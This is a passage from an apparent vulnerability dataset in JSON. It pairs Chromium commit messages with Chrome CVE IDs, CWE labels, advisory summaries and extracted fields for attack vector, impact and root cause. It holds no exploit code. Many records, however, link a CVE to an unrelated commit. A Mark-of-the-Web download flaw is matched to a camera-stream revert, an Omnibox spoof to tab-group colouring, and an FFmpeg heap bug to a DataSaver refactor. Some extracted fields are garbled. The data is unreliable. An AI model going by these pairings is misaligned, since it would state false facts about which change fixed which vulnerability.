inject arbitrary scripts or HTML (UXSS) via a crafted HTML page.","commit_message_1":"add boolean to userintiatedinfo noting if an input event led to navigation","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted html page","Impact":"inject arbitrary scripts or html ( uxss )","Root Cause":"caused by improper validation of user-supplied input by Blink","Attack Type":"remote attacker"},{"commit_id":"d59a4441697f6253e7dc3f7ae5caad6e5fd2c778","cve_id":"CVE-2016-5209","cwe_id":"CWE-787","commit_message":"Prevent bad casting in ImageBitmap when calling ArrayBuffer::createOrNull\n\nCurrently when ImageBitmap's constructor is invoked, we check whether\ndstSize will overflow size_t or not. The problem comes when we call\nArrayBuffer::createOrNull some times in the code.\n\nBoth parameters of ArrayBuffer::createOrNull are unsigned. In ImageBitmap\nwhen we call this method, the first parameter is usually width * height.\nThis could overflow unsigned even if it has been checked safe with size_t,\nthe reason is that unsigned is a 32-bit value on 64-bit systems, while\nsize_t is a 64-bit value.\n\nThis CL makes a change such that we check whether the dstSize will overflow\nunsigned or not. In this case, we can guarantee that createOrNull will not have\nany crash.\n\nBUG=664139\n\nReview-Url: https:\/\/codereview.chromium.org\/2500493002\nCr-Commit-Position: refs\/heads\/master@{#431936}","summary":"Bad casting in bitmap manipulation in Blink in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"prevent bad casting in imagebitmap when calling arraybuffer : :createornull currently when imagebitmap 's constructor is invoked , we check whether dstsize will overflow size_t or not","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"fff73016a86f9a5990d080dc76058f8528a423f9","cve_id":"CVE-2016-5214","cwe_id":"CWE-19","commit_message":"Revert \"Enable camera blob stream when needed\"\n\nThis reverts commit 10f4b93635e12f9fa0cba1641a10938ca38ed448.\n\nReason for revert:\n\nFindit (https:\/\/goo.gl\/kROfz5) identified CL at revision 601492 as the\nculprit for failures in the build cycles as shown on:\nhttps:\/\/findit-for-me.appspot.com\/waterfall\/culprit?key=ag9zfmZpbmRpdC1mb3ItbWVyRAsSDVdmU3VzcGVjdGVkQ0wiMWNocm9taXVtLzEwZjRiOTM2MzVlMTJmOWZhMGNiYTE2NDFhMTA5MzhjYTM4ZWQ0NDgM\n\nSample Failed Build: https:\/\/ci.chromium.org\/buildbot\/chromium.memory\/Linux%20ChromiumOS%20MSan%20Tests\/9190\n\nSample Failed Step: capture_unittests\n\nOriginal change's description:\n> Enable camera blob stream when needed\n> \n> Since blob stream needs higher resolution, it causes higher cpu loading\n> to require higher resolution and resize to smaller resolution.\n> In hangout app, we don't need blob stream. Enabling blob stream when\n> needed can save a lot of cpu usage.\n> \n> BUG=b:114676133\n> TEST=manually test in apprtc and CCA. make sure picture taking still\n> works in CCA.\n> \n> Change-Id: I9144461bc76627903d0b3b359ce9cf962ff3628c\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1261242\n> Commit-Queue: Heng-ruey Hsu <henryhsu@chromium.org>\n> Reviewed-by: Ricky Liang <jcliang@chromium.org>\n> Reviewed-by: Xiaohan Wang <xhwang@chromium.org>\n> Reviewed-by: Robert Sesek <rsesek@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#601492}\n\nNo-Presubmit: true\nNo-Tree-Checks: true\nNo-Try: true\nBUG=b:114676133\n\nChange-Id: If173ffe9259f7eca849b184806bd56e2a9fbaac4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1292256\nCr-Commit-Position: refs\/heads\/master@{#601538}","summary":"Google Chrome prior to 55.0.2883.75 for Windows mishandled downloaded files, which allowed a remote attacker to prevent the downloaded file from receiving the Mark of the Web via a crafted HTML page.","commit_message_1":"revert `` enable camera blob stream when needed '' this reverts commit 10f4b93635e12f9fa0cba1641a10938ca38ed448","Vulnerability Type":"Data Processing Errors","Attack Vector":"via a crafted html page","Impact":"prevent the downloaded file from receiving the mark of the web","Root Cause":"mishandled downloaded files","Attack Type":"remote attacker"},{"commit_id":"bf6a6765d44b09c64b8c75d749efb84742a250e7","cve_id":"CVE-2016-5216","cwe_id":"CWE-416","commit_message":"[pdf] Defer page unloading in JS callback.\n\nOne of the callbacks from PDFium JavaScript into the embedder is to get the\ncurrent page number. In Chromium, this will trigger a call to\nCalculateMostVisiblePage that method will determine the visible pages and unload\nany non-visible pages. But, if the originating JS is on a non-visible page\nwe'll delete the page and annotations associated with that page. This will\ncause issues as we are currently working with those objects when the JavaScript\nreturns.\n\nThis Cl defers the page unloading triggered by getting the most visible page\nuntil the next event is handled by the Chromium embedder.\n\nBUG=chromium:653090\n\nReview-Url: https:\/\/codereview.chromium.org\/2418533002\nCr-Commit-Position: refs\/heads\/master@{#424781}","summary":"A use after free in PDFium in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android allowed a remote attacker to perform an out of bounds memory read via a crafted PDF file.","commit_message_1":"defer page unloading in j callback","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted pdf file","Impact":"perform an out of bounds memory read","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"0d68cbd77addd38909101f76847deea56de00524","cve_id":"CVE-2016-5217","cwe_id":"CWE-284","commit_message":"Fix PIP window being blank after minimize\/show\n\nDesktopWindowTreeHostX11::SetVisible only made the call into\nOnNativeWidgetVisibilityChanged when transitioning from shown\nto minimized and not vice versa.  This is because this change\nhttps:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1437263\nconsidered IsVisible to be true when minimized, which made\nIsVisible always true in this case.  This caused layers to be hidden\nbut never shown again.\n\nThis is a reland of:\nhttps:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1580103\n\nBug: 949199\nChange-Id: I2151cd09e537d8ce8781897f43a3b8e9cec75996\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1584617\nReviewed-by: Scott Violet <sky@chromium.org>\nCommit-Queue: enne <enne@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#654280}","summary":"The extensions API in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android incorrectly permitted access to privileged plugins, which allowed a remote attacker to bypass site isolation via a crafted HTML page.","commit_message_1":"fix pip window being blank after minimize\/show desktopwindowtreehostx11 : :setvisible only made the call into onnativewidgetvisibilitychanged when transitioning from shown to minimized and not vice versa","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted html page","Impact":"bypass site isolation","Root Cause":"caused by the use of unvalidated data","Attack Type":"remote attacker"},{"commit_id":"45d901b56f578a74b19ba0d10fa5c4c467f19303","cve_id":"CVE-2016-5218","cwe_id":"CWE-20","commit_message":"Paint tab groups with the group color.\n\n* The background of TabGroupHeader now uses the group color.\n* The backgrounds of tabs in the group are tinted with the group color.\n\nThis treatment, along with the colors chosen, are intended to be\na placeholder.\n\nBug: 905491\nChange-Id: Ic808548f8eba23064606e7fb8c9bba281d0d117f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1610504\nCommit-Queue: Bret Sepulveda <bsep@chromium.org>\nReviewed-by: Taylor Bergquist <tbergquist@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#660498}","summary":"The extensions API in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android incorrectly handled navigation within PDFs, which allowed a remote attacker to temporarily spoof the contents of the Omnibox (URL bar) via a crafted HTML page containing PDF data.","commit_message_1":"paint tab group with the group color","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page containing pdf data","Impact":"temporarily spoof the contents of the omnibox ( url bar )","Root Cause":"incorrectly handled navigation within pdfs","Attack Type":"remote attacker"},{"commit_id":"c6f0d22d508a551a40fc8bd7418941b77435aac3","cve_id":"CVE-2016-5220","cwe_id":"CWE-200","commit_message":"omnibox: experiment with restoring placeholder when caret shows\n\nShows the \"Search Google or type a URL\" omnibox placeholder even when\nthe caret (text edit cursor) is showing \/ when focused. views::Textfield\nworks this way, as does <input placeholder=\"\">. Omnibox and the NTP's\n\"fakebox\" are exceptions in this regard and this experiment makes this\nmore consistent.\n\nR=tommycli@chromium.org\nBUG=955585\n\nChange-Id: I23c299c0973f2feb43f7a2be3bd3425a80b06c2d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1582315\nCommit-Queue: Dan Beam <dbeam@chromium.org>\nReviewed-by: Tommy Li <tommycli@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#654279}","summary":"PDFium in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android incorrectly handled navigation within PDFs, which allowed a remote attacker to read local files via a crafted PDF file.","commit_message_1":"experiment with restoring placeholder when caret show show the `` search google or type a url '' omnibox placeholder even when the caret ( text edit cursor ) is showing \/ when focused","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted pdf file","Impact":"read local files","Root Cause":"incorrectly handled navigation within pdfs ","Attack Type":"remote attacker"},{"commit_id":"e4ebe078840e65d673722e94f8251b334030b5e8","cve_id":"CVE-2016-5222","cwe_id":"CWE-20","commit_message":"Drop navigations to NavigationEntry with invalid virtual URLs.\n\nBUG=657720\nCQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_site_isolation\n\nReview-Url: https:\/\/codereview.chromium.org\/2452443002\nCr-Commit-Position: refs\/heads\/master@{#428056}","summary":"Incorrect handling of invalid URLs in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"drop navigation to navigationentry with invalid virtual url","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"4ac4aff49c4c539bce6d8a0d8800c01324bb6bc0","cve_id":"CVE-2016-5225","cwe_id":"CWE-19","commit_message":"Enforce form-action CSP even when form.target is present.\n\nBUG=630332\n\nReview-Url: https:\/\/codereview.chromium.org\/2464123004\nCr-Commit-Position: refs\/heads\/master@{#429922}","summary":"Blink in Google Chrome prior to 55.0.2883.75 for Mac, Windows and Linux, and 55.0.2883.84 for Android incorrectly handled form actions, which allowed a remote attacker to bypass Content Security Policy via a crafted HTML page.","commit_message_1":"enforce form-action csp even when <file> is present","Vulnerability Type":"Data Processing Errors","Attack Vector":"via a crafted html page","Impact":"bypass content security policy","Root Cause":"incorrectly handled form actions ","Attack Type":"remote attacker"},{"commit_id":"c995d4fe5e96f4d6d4a88b7867279b08e72d2579","cve_id":"CVE-2016-5199","cwe_id":"CWE-119","commit_message":"Move IsDataSaverEnabledByUser to be a static method and use it\n\nThis method now officially becomes the source of truth that\neverything in the code base eventually calls into to determine whether\nor not DataSaver is enabled.\n\nBug: 934399\nChange-Id: Iae837b710ace8cc3101188f79d02cbc2d4f0fd93\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1537242\nReviewed-by: Joshua Pawlicki <waffles@chromium.org>\nReviewed-by: Tarun Bansal <tbansal@chromium.org>\nCommit-Queue: Robert Ogden <robertogden@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#643948}","summary":"An off by one error resulting in an allocation of zero size in FFmpeg in Google Chrome prior to 54.0.2840.98 for Mac, and 54.0.2840.99 for Windows, and 54.0.2840.100 for Linux, and 55.0.2883.84 for Android allowed a remote attacker to potentially exploit heap corruption via a crafted video file.","commit_message_1":"move isdatasaverenabledbyuser to be a static method and use it this method now officially becomes the source of truth that everything in the code base eventually call into to determine whether or not datasaver is enabled","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted video file","Impact":"potentially exploit heap corruption","Root Cause":"caused by a heap corruption","Attack Type":"remote attacker"},{"commit_id":"2f19869af13bbfdcfd682a55c0d2c61c6e102475","cve_id":"CVE-2016-5200","cwe_id":"CWE-119","commit_message":"chrome\/browser\/ui\/webauthn: long domains may cause a line break.\n\nAs requested by UX in [1], allow long host names to split a title into\ntwo lines. This allows us to show more of the name before eliding,\nalthough sufficiently long names will still trigger elision.\n\nScreenshot at\nhttps:\/\/drive.google.com\/open?id=1_V6t2CeZDAVazy3Px-OET2LnB__aEW1r.\n\n[1] https:\/\/docs.google.com\/presentation\/d\/1TtxkPUchyVZulqgdMcfui-68B0W-DWaFFVJEffGIbLA\/edit#slide=id.g5913c4105f_1_12\n\nChange-Id: I70f6541e0db3e9942239304de43b487a7561ca34\nBug: 870892\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1601812\nAuto-Submit: Adam Langley <agl@chromium.org>\nCommit-Queue: Nina Satragno <nsatragno@chromium.org>\nReviewed-by: Nina Satragno <nsatragno@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#658114}","summary":"V8 in Google Chrome prior to 54.0.2840.98 for Mac, and 54.0.2840.99 for Windows, and 54.0.2840.100 for Linux, and 55.0.2883.84 for Android incorrectly applied type rules, which allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"long domain may cause a line break","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"android incorrectly applied type rules","Attack Type":"remote attacker"},{"commit_id":"79708b391b2e91d63b5d009ec6202c7d7ededf93","cve_id":"CVE-2016-5202","cwe_id":"CWE-732","commit_message":"Ensure that OpenVR only adds placeholder buttons when needed.\n\nThe current implementation of the OpenVRGamepadHelper always adds the\noptional grip and secondary axes buttons; however, if those buttons are\nmissing and no additional buttons need to be supported, they should not\nbe included. A prime example of this is the vive controller, which has\na trigger, a grip, and a touchpad, but no secondary axis button.  This\nis essentially the controller that the new TestGamepadOptionalData test\nbuilds.\n\nBug: 964026\nChange-Id: I1de93b5bd7bd0d9e75013cf33b8f333e5d70270f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1627914\nReviewed-by: Bill Orr <billorr@chromium.org>\nCommit-Queue: Alexander Cooper <alcooper@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#662843}","summary":"browser\/extensions\/api\/dial\/dial_registry.cc in Google Chrome before 54.0.2840.98 on macOS, before 54.0.2840.99 on Windows, and before 54.0.2840.100 on Linux neglects to copy a device ID before an erase() call, which causes the erase operation to access data that that erase operation will destroy.","commit_message_1":"ensure that openvr only add placeholder button when needed","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"via unspecified vectors","Impact":"causes the erase operation to access data","Root Cause":"An unspecified error","Attack Type":"remote attacker"},{"commit_id":"cc7aad3f6b3d6ad7f9a4b1b4f8e983e0eec7bdb6","cve_id":"CVE-2016-5198","cwe_id":"CWE-125","commit_message":"Lock generator_mutex_ inside DecodeFailed\n\nBug: 962126\n\nWe typically lock this mutex before reading or writing to\ndecode_failed_. Do so in one more place to avoid a data race.\n\nChange-Id: I0248e4dd99defc5ad3d09575096847e6455adfc9\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1610085\nReviewed-by: Khushal <khushalsagar@chromium.org>\nReviewed-by: Stephen Chenney <schenney@chromium.org>\nCommit-Queue: Stephen Chenney <schenney@chromium.org>\nAuto-Submit: Leon Scroggins <scroggo@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#659475}","summary":"V8 in Google Chrome prior to 54.0.2840.90 for Linux, and 54.0.2840.85 for Android, and 54.0.2840.87 for Windows and Mac included incorrect optimisation assumptions, which allowed a remote attacker to perform arbitrary read\/write operations, leading to code execution, via a crafted HTML page.","commit_message_1":"lock generator_mutex_ inside decodefailed we typically lock this mutex before reading or writing to decode_failed_","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"perform arbitrary read \/ write operations , leading to code execution","Root Cause":"included incorrect optimisation assumptions","Attack Type":"remote attacker"},{"commit_id":"dcd538eb3daf6c52d3ebef0a7afea758f6c657c8","cve_id":"CVE-2016-1661","cwe_id":"CWE-20","commit_message":"Don't report OnFirstSurfaceActivation for ui::Compositor\n\nBug: 893850\nChange-Id: Iee754cefbd083d0a21a2b672fb8e837eaab81c43\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1293712\nReviewed-by: Antoine Labour <piman@chromium.org>\nCommit-Queue: Saman Sami <samans@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#601629}","summary":"Blink, as used in Google Chrome before 50.0.2661.94, does not ensure that frames satisfy a check for the same renderer process in addition to a Same Origin Policy check, which allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted web site, related to BindingSecurity.cpp and DOMWindow.cpp.","commit_message_1":"do n't report onfirstsurfaceactivation for ui : :compositor","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted web site , related to bindingsecurity . cpp and domwindow . cpp","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"does not ensure that frames satisfy a check for the same renderer process","Attack Type":"remote attacker"},{"commit_id":"829f713b4c75ddbe7db806b551f1e3b08bb5e95c","cve_id":"CVE-2016-1662","cwe_id":null,"commit_message":"Add keepalive support to drivefs API\n\nIn some situations mounting drivefs may take very long time. To\ndistinguish it from a total hang we send periodic keepalives from drivefs.\n\nBUG=chromium:899746\n\nChange-Id: Iee906651557a8f8eab62d58298f33c7c3e61724e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1305253\nCommit-Queue: Sergei Datsenko <dats@chromium.org>\nReviewed-by: Sam McNally <sammc@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#603732}","summary":"extensions\/renderer\/gc_callback.cc in Google Chrome before 50.0.2661.94 does not prevent fallback execution once the Garbage Collection callback has started, which allows remote attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"add keepalive support to drivefs api in some situation mounting drivefs may take very long time","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"does not prevent fallback execution once the garbage collection callback has started","Attack Type":"remote attacker"},{"commit_id":"2400ef7b592c31c9883fd1cd60bdea0622e69db3","cve_id":"CVE-2016-1663","cwe_id":null,"commit_message":"When we can't neuter ArrayBuffers, we can't transfer them\n\nInstead, we need to copy\n\nBUG=603987\nR=haraken@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/1904913002\n\nCr-Commit-Position: refs\/heads\/master@{#388719}","summary":"The SerializedScriptValue::transferArrayBuffers function in WebKit\/Source\/bindings\/core\/v8\/SerializedScriptValue.cpp in the V8 bindings in Blink, as used in Google Chrome before 50.0.2661.94, mishandles certain array-buffer data structures, which allows remote attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact via a crafted web site.","commit_message_1":"when we ca n't neuter arraybuffers , we ca n't transfer them instead , we need to copy bug=<number> review url : http : \/\/<file>","Vulnerability Type":"unspecified","Attack Vector":"via a crafted web site ","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other","Root Cause":"certain array - buffer data structures","Attack Type":"remote attacker"},{"commit_id":"bb3548ef2fcdb58f9bc638bb5a3c379320fdd0e0","cve_id":"CVE-2016-1664","cwe_id":"CWE-254","commit_message":"Fix HistoryEntry corruption when commit isn't for provisional entry.\n\nBUG=597322\nTEST=See bug for repro steps.\n\nReview URL: https:\/\/codereview.chromium.org\/1848103004\n\nCr-Commit-Position: refs\/heads\/master@{#384659}","summary":"The HistoryController::UpdateForCommit function in content\/renderer\/history_controller.cc in Google Chrome before 50.0.2661.94 mishandles the interaction between subframe forward navigations and other forward navigations, which allows remote attackers to spoof the address bar via a crafted web site.","commit_message_1":"fix historyentry corruption when commit is n't for provisional entry","Vulnerability Type":"Security Features","Attack Vector":"via a crafted web site","Impact":"spoof the address bar","Root Cause":"mishandles the interaction between subframe forward navigations and other forward navigations","Attack Type":"remote attacker"},{"commit_id":"282f53ffdc3b1902da86f6a0791af736837efbf8","cve_id":"CVE-2016-1665","cwe_id":"CWE-20","commit_message":"[signin] Add metrics to track the source for refresh token updated events\n\nThis CL add a source for update and revoke credentials operations. It then\nsurfaces the source in the chrome:\/\/signin-internals page.\n\nThis CL also records the following histograms that track refresh token events:\n* Signin.RefreshTokenUpdated.ToValidToken.Source\n* Signin.RefreshTokenUpdated.ToInvalidToken.Source\n* Signin.RefreshTokenRevoked.Source\n\nThese histograms are needed to validate the assumptions of how often tokens\nare revoked by the browser and the sources for the token revocations.\n\nBug: 896182\n\nChange-Id: I2fcab80ee8e5699708e695bc3289fa6d34859a90\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1286464\nReviewed-by: Jochen Eisinger <jochen@chromium.org>\nReviewed-by: David Roger <droger@chromium.org>\nReviewed-by: Ilya Sherman <isherman@chromium.org>\nCommit-Queue: Mihai Sardarescu <msarda@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#606181}","summary":"The JSGenericLowering class in compiler\/js-generic-lowering.cc in Google V8, as used in Google Chrome before 50.0.2661.94, mishandles comparison operators, which allows remote attackers to obtain sensitive information via crafted JavaScript code.","commit_message_1":"add metric to track the source for refresh token updated event this cl add a source for update and revoke credential operation","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted javascript code","Impact":"obtain sensitive information","Root Cause":"caused by a leak","Attack Type":"remote attacker"},{"commit_id":"8b10115b2410b4bde18e094ad9fb8c5056134c87","cve_id":"CVE-2016-1666","cwe_id":null,"commit_message":"Fix ChromeResourceDispatcherHostDelegateMirrorBrowserTest.MirrorRequestHeader with network service.\n\nThe functionality worked, as part of converting DICE, however the test code didn't work since it\ndepended on accessing the net objects directly. Switch the tests to use the EmbeddedTestServer, to\nbetter match production, which removes the dependency on net\/.\n\nAlso:\n-make GetFilePathWithReplacements replace strings in the mock headers if they're present\n-add a global to google_util to ignore ports; that way other tests can be converted without having\n  to modify each callsite to google_util\n\nBug: 881976\nChange-Id: Ic52023495c1c98c1248025c11cdf37f433fef058\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1328142\nCommit-Queue: John Abd-El-Malek <jam@chromium.org>\nReviewed-by: Ramin Halavati <rhalavati@chromium.org>\nReviewed-by: Maks Orlovich <morlovich@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#607652}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 50.0.2661.94 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"fix <file> with network service","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"2f8e481c12c9e8de107b73508b6c283569d4df5b","cve_id":"CVE-2018-18337","cwe_id":"CWE-416","commit_message":"Avoid crash when setting rel=stylesheet on <link> in shadow root.\n\nLink elements in shadow roots without rel=stylesheet are currently not\nadded as stylesheet candidates upon insertion. This causes a crash if\nrel=stylesheet is set (and then loaded) later.\n\nR=futhark@chromium.org\n\nBug: 886753\nChange-Id: Ia0de2c1edf43407950f973982ee1c262a909d220\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1242463\nCommit-Queue: Anders Ruud <andruud@chromium.org>\nReviewed-by: Rune Lillesveen <futhark@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#593907}","summary":"Incorrect handling of stylesheets leading to a use after free in Blink in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"avoid crash when setting rel=stylesheet on < link > in shadow root","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"78d89fe556cb5dabbc47b4967cdf55e607e29580","cve_id":"CVE-2018-18338","cwe_id":"CWE-119","commit_message":"Fix *StaticBitmapImage ThreadChecker and unaccelerated SkImage destroy\n\n- AcceleratedStaticBitmapImage was misusing ThreadChecker by having its\nown detach logic. Using proper DetachThread is simpler, cleaner and\ncorrect.\n- UnacceleratedStaticBitmapImage didn't destroy the SkImage in the\nproper thread, leading to GrContext\/SkSp problems.\n\nBug: 890576\nChange-Id: Ic71e7f7322b0b851774628247aa5256664bc0723\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1307775\nReviewed-by: Gabriel Charette <gab@chromium.org>\nReviewed-by: Jeremy Roman <jbroman@chromium.org>\nCommit-Queue: Fernando Serboncini <fserb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#604427}","summary":"Incorrect, thread-unsafe use of SkImage in Canvas in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fix * staticbitmapimage threadchecker and unaccelerated skimage destroy - acceleratedstaticbitmapimage wa misusing threadchecker by having it own detach logic","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by improper bounds checking by Canvas","Attack Type":"remote attacker"},{"commit_id":"e34e01b1b0987e418bc22e3ef1cf2e4ecaead264","cve_id":"CVE-2018-18339","cwe_id":"CWE-119","commit_message":"[scheduler] Remove implicit fallthrough in switch\n\nBail out early when a condition in the switch is fulfilled.\nThis does not change behaviour due to RemoveTaskObserver being no-op when\nthe task observer is not present in the list.\n\nR=thakis@chromium.org\n\nBug: 177475\nChange-Id: Ibc7772c79f8a8c8a1d63a997dabe1efda5d3a7bd\nReviewed-on: https:\/\/chromium-review.googlesource.com\/891187\nReviewed-by: Nico Weber <thakis@chromium.org>\nCommit-Queue: Alexander Timin <altimin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#532649}","summary":"Incorrect object lifecycle in WebAudio in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"remove implicit fallthrough in switch bail out early when a condition in the switch is fulfilled","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"f5ef337d8fffd10ab327069467ccaedb843cf9db","cve_id":"CVE-2018-18340","cwe_id":"CWE-119","commit_message":"Check context is attached before creating MediaRecorder\n\nBug: 896736\nChange-Id: I3ccfd2188fb15704af14c8af050e0a5667855d34\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1324231\nCommit-Queue: Emircan Uysaler <emircan@chromium.org>\nReviewed-by: Miguel Casas <mcasas@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#606242}","summary":"Incorrect object lifecycle in MediaRecorder in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"check context is attached before creating mediarecorder","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"dae5b388b44dae4dc11668dba210bbb92d72d969","cve_id":"CVE-2018-18341","cwe_id":"CWE-190","commit_message":"Add bounds CHECK to UTF-8 decoder memory allocation.\n\nAvoid integer overflow when computing a total buffer size from a base\nbuffer and small partial sequence buffer.\n\nBug: 901030\nChange-Id: Ic82db2c6af770bd748fb1ec881999d0dfaac30f0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1313833\nReviewed-by: Chris Palmer <palmer@chromium.org>\nCommit-Queue: Joshua Bell <jsbell@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#605011}","summary":"An integer overflow leading to a heap buffer overflow in Blink in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"add bound check to utf-<number> decoder memory allocation","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by improper bounds checking by Blink","Attack Type":"remote attacker"},{"commit_id":"c71d8045ce0592cf3f4290744ab57b23c1d1b4c6","cve_id":"CVE-2018-18344","cwe_id":"CWE-20","commit_message":"[DevTools] Do not allow Page.setDownloadBehavior for extensions\n\nBug: 866426\nChange-Id: I71b672978e1a8ec779ede49da16b21198567d3a4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1270007\nCommit-Queue: Dmitry Gozman <dgozman@chromium.org>\nReviewed-by: Devlin <rdevlin.cronin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#598004}","summary":"Inappropriate allowance of the setDownloadBehavior devtools protocol feature in Extensions in Google Chrome prior to 71.0.3578.80 allowed a remote attacker with control of an installed extension to access files on the local file system via a crafted Chrome Extension.","commit_message_1":"do not allow <file> for extension","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted chrome extension","Impact":"to access files on the local file system","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"2078096efde1976b0fa9c820df90cedbfb2b13bc","cve_id":"CVE-2018-18345","cwe_id":null,"commit_message":"Lock down blob\/filesystem URL creation with a stronger CPSP::CanCommitURL()\n\nChildProcessSecurityPolicy::CanCommitURL() is a security check that's\nsupposed to tell whether a given renderer process is allowed to commit\na given URL.  It is currently used to validate (1) blob and filesystem\nURL creation, and (2) Origin headers.  Currently, it has scheme-based\nchecks that disallow things like web renderers creating\nblob\/filesystem URLs in chrome-extension: origins, but it cannot stop\none web origin from creating those URLs for another origin.\n\nThis CL locks down its use for (1) to also consult\nCanAccessDataForOrigin().  With site isolation, this will check origin\nlocks and ensure that foo.com cannot create 